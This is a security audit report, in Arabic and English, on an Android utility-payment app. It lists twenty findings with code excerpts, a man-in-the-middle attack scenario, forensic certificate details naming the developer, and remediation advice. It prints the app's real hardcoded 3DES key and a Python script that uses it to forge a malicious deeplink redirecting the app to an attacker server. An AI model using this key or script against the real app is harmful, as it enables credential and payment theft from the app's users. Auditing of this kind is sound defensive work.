# ملخص نتائج الفحص الأمني (Security Findings Summary)
## التطبيق: AbbasiyCashiers — ECAS WEB v18.4
## Package: `com.egy.webpaymentapp`

---

## جدول النتائج المُرقَّمة (Findings Matrix)

| # | المشكلة | الخطورة | OWASP MASVS | الموقع |
|---|---------|---------|-------------|--------|
| F-01 | TrustManager يقبل أي شهادة SSL | 🔴 **Critical** | MSTG-NETWORK-3 | `c/b/a/f/d.java` |
| F-02 | HostnameVerifier دائماً يُرجع true | 🔴 **Critical** | MSTG-NETWORK-3 | `c/b/a/f/c.java:45` |
| F-03 | WebView يقبل أخطاء SSL عبر `proceed()` | 🔴 **Critical** | MSTG-NETWORK-3 | `Screens/web/h.java` |
| F-04 | مفتاح DESede مُضَمَّن (Hardcoded) | 🔴 **Critical** | MSTG-CRYPTO-1 | `MediaSessionCompat.java:621` |
| F-05 | استخدام DESede + ECB (خوارزمية مهجورة) | 🟠 **High** | MSTG-CRYPTO-4 | `MediaSessionCompat.java:s/r` |
| F-06 | Deeplink يسمح بتغيير IP الخادم | 🔴 **Critical** | MSTG-PLATFORM-3 | `LoginActivity.java:143` |
| F-07 | `setAllowUniversalAccessFromFileURLs(true)` | 🔴 **High** | MSTG-PLATFORM-6 | `WebviewActivity.java:438` |
| F-08 | `addJavascriptInterface` مكشوف للويب | 🟠 **High** | MSTG-PLATFORM-7 | `WebviewActivity.java:440` |
| F-09 | Backdoor: تسجيل دخول `1/1/1` يفتح الإعدادات | 🟡 **Medium** | MSTG-CODE-2 | `LoginActivity.java:65` |
| F-10 | `usesCleartextTraffic="true"` في Manifest | 🟠 **High** | MSTG-NETWORK-2 | `AndroidManifest.xml:33` |
| F-11 | لا يوجد `networkSecurityConfig` | 🟠 **High** | MSTG-NETWORK-2 | Manifest |
| F-12 | لا يوجد Certificate Pinning نهائياً | 🟠 **High** | MSTG-NETWORK-4 | App-wide |
| F-13 | جمع IMEI كـ device fingerprint | 🟡 **Medium** | MSTG-STORAGE-4 | `MediaSessionCompat.D()` |
| F-14 | أذونات مفرطة (MANAGE_EXTERNAL_STORAGE, REQUEST_INSTALL_PACKAGES) | 🟡 **Medium** | MSTG-PLATFORM-1 | Manifest |
| F-15 | لا توجد أي حماية ضد الهندسة العكسية | 🟡 **Medium** | MSTG-RESILIENCE-1..4 | App-wide |
| F-16 | تشويش R8/ProGuard ضعيف (أسماء فقط) | 🟢 **Low** | MSTG-RESILIENCE-9 | App-wide |
| F-17 | شهادة التوقيع self-signed، تضارب اسم المُصدِر | 🟡 **Medium** | — | CERT.RSA |
| F-18 | تخزين بيانات الجلسة بنص واضح في SharedPreferences | 🟠 **High** | MSTG-STORAGE-1 | `c.b.a.c` |
| F-19 | عدم تنظيف Token من الذاكرة بعد الاستخدام | 🟢 **Low** | MSTG-STORAGE-10 | `User.s("")` |
| F-20 | لا توجد آلية كشف التلاعب بـ APK | 🟡 **Medium** | MSTG-RESILIENCE-3 | App-wide |

**الإجمالي:** 6 Critical, 5 High, 7 Medium, 2 Low

---

## تفاصيل النتائج الحرجة

### F-01 + F-02 + F-03: تعطيل كامل لـ TLS Validation

**الكود المُكتشف:**
```java
// c/b/a/f/d.java
public void checkServerTrusted(X509Certificate[] x509CertificateArr, String str) { }

// c/b/a/f/c.java
public boolean verify(String str, SSLSession sSLSession) { return true; }

// Screens/web/h.java
public void onReceivedSslError(WebView w, SslErrorHandler h, SslError e) {
    h.proceed();  // قبول أي خطأ
}
```

**الأثر:**
- اعتراض كامل لطلبات API (login, payments, readings)
- استخراج Tokens مباشرةً
- حقن استجابات ضارة (مثل تعديل الأرصدة)
- سرقة بيانات اعتماد ~ المستخدمين

**سيناريو هجوم Real-world:**
1. مهاجم على نفس Wi-Fi (مقهى، شبكة شركة، Rogue AP)
2. يقوم بـ ARP spoofing + mitmproxy على المنفذ 8057
3. يسجل جميع طلبات `/api/Users/Login` بكلمات مرور مشفرة بـ RSA
4. **لكن** بما أن المهاجم يقدم مفتاحه العام للتطبيق (لأن TrustManager معطل)، فإن كلمة المرور تُشفَّر بمفتاح المهاجم نفسه — قابلة لفك التشفير!

---

### F-04 + F-05: المفتاح المُضَمَّن

```java
private static final String SECRET = "m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##";
// Used to derive 3DES key via:
// key = MD5(SECRET) | MD5(SECRET)[0:8]   (24 bytes for 3DES)
```

**أداة استخراج/فك التشفير العملية (للمدققين):**
```python
#!/usr/bin/env python3
# decrypt_ecas.py - فك تشفير سلاسل التطبيق
import hashlib, base64
from Crypto.Cipher import DES3

HARDCODED = b"m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##"

def get_key():
    md5 = hashlib.md5(HARDCODED).digest()
    return md5 + md5[:8]  # 24 bytes

def decrypt(b64_ct):
    cipher = DES3.new(get_key(), DES3.MODE_ECB)
    pt = cipher.decrypt(base64.b64decode(b64_ct))
    return pt.rstrip(b'\x00').decode('utf-8', errors='replace')

def encrypt(plaintext):
    cipher = DES3.new(get_key(), DES3.MODE_ECB)
    # Pad to 8 bytes
    pad_len = 8 - (len(plaintext) % 8)
    padded = plaintext.encode() + (b'\x00' * pad_len)
    return base64.b64encode(cipher.encrypt(padded)).decode()

if __name__ == "__main__":
    # Build malicious deeplink
    evil_url = encrypt("evil-server.example.com:8057/payment")
    print(f"https://ecas.web.link/?ip={evil_url}")
```

---

### F-09: Magic Backdoor

```java
if (q.getText().equals("1") && r.getText().equals("1") && s.getText().equals("1")) {
    // فتح APPLICATION_DETAILS_SETTINGS
}
```

**التفسير:** هذا "test backdoor" يبدو أنه أُضيف للتطوير ولم يُحذف. ليس استغلالاً مباشراً عن بُعد، لكنه:
- يكشف عن ضعف في عملية QA / Release management
- قد يُشير لوجود backdoors أخرى أعمق
- يخالف PCI DSS Req 6.3.1 (إزالة كود التطوير قبل الإنتاج)

---

### F-13: جمع IMEI

```java
public static String D(Context context) {
    if (Build.VERSION.SDK_INT >= 29) {
        return Settings.Secure.getString(context.getContentResolver(), "android_id");
    }
    TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
    return tm.getDeviceId();  // ⚠️ IMEI - permanent hardware identifier
}
```

**التأثير القانوني:** انتهاك GDPR Article 4(1) - IMEI يُعتبر personal data. غير متوافق مع Google Play policy منذ Android 10 (لا يمكن الوصول إلى IMEI بدون privileged permission).

---

## معلومات Forensics

### تواقيع الملف (File Hashes)
```
SHA256: 0204b3569727de3f46bdd2f0c0545d7b0088e0d51f1f48e8ea7fa0cf5167e6b2
MD5:    257aedaa619545c42a72b6e9023f7703
Size:   19,502,156 bytes (~19 MB)
```

### بصمات الشهادة (Signing Certificate)
```
Owner: CN=Yahya Aljamal, OU=United Power, O=United Power, L=Sanaa, ST=Sanaa, C=YE
Issuer: (Self-signed, same)
Serial: 611c481b
Validity: Aug 06 2021 → Jul 31 2046 (25 سنة - طويلة جداً)
SHA1:   25:B2:36:BF:3F:CF:9B:6B:6A:03:4B:D8:AC:12:C0:90:3C:5A:8D:1C
SHA256: C6:BA:D5:38:29:26:09:34:0D:53:35:0D:C3:ED:9E:88:F3:2D:A3:11:26:87:78:AB:69:1C:87:13:10:99:68:65
Algorithm: SHA256withRSA, 2048-bit
```

### ملاحظات على الشهادة
- **تضارب الهوية:** اسم الحزمة `com.egy.webpaymentapp` (egy = Egypt) لكن المُصدِر من اليمن (Yemen).
- **شهادة self-signed**: عادية لتطبيقات Android، لكن لا توفر هوية ثالثة.
- **العنوان**: `Sanaa, Yemen` + اسم منظمة `United Power` (شركة كهرباء/طاقة محتملة).
- **الخادم:** `abbasiy.yedns.org:8057` — `yedns.org` هو خدمة DNS ديناميكي في اليمن (YE-DNS).

### استنتاج Attribution محتمل
هذا تطبيق فاتورة/جمع رسوم لشركة كهرباء أو خدمات في اليمن (شركة "United Power" أو "العباسية")، تم تطويره أو نشره بواسطة `Yahya Aljamal`. الـ `webpaymentapp` يعكس وظيفة الدفع، و"Cashier" يعكس دور المستخدم النهائي (محصِّل/جابي).

---

## التوصيات حسب الأولوية

### فورية (أولوية قصوى):
1. **إزالة TrustManager المُعطل** واستخدام `OkHttpClient` مع certificate pinning صحيح
2. **حذف SDESede والمفتاح الثابت** والاستعاضة بـ AES-256-GCM + key derivation من Android Keystore
3. **حذف Magic Backdoor `1/1/1`** من LoginActivity
4. **إضافة validation للـ deeplink** (whitelist محدد + توقيع HMAC على المعاملات)

### قصيرة المدى:
5. تطبيق `networkSecurityConfig` يفرض TLS 1.2+ + pinning
6. إصلاح أسماء الأذونات `Manifest.permission.*`
7. إزالة `setAllowUniversalAccessFromFileURLs` و تقييد JS-bridge
8. إزالة `usesCleartextTraffic`

### متوسطة المدى:
9. إضافة Root/Tamper detection (مكتبة مثل RootBeer)
10. تشويش متقدم بـ R8 + DexGuard
11. ترحيل من IMEI إلى UUID مُولَّد محلياً + ربط بالخادم
12. تطبيق SafetyNet / Play Integrity API

### طويلة المدى:
13. مراجعة شاملة للكود من قِبَل مدقق أمني خارجي
14. تطبيق SAST/DAST في CI/CD
15. شهادة PCI DSS / SOC 2 إذا كان التطبيق يعالج مدفوعات حقيقية
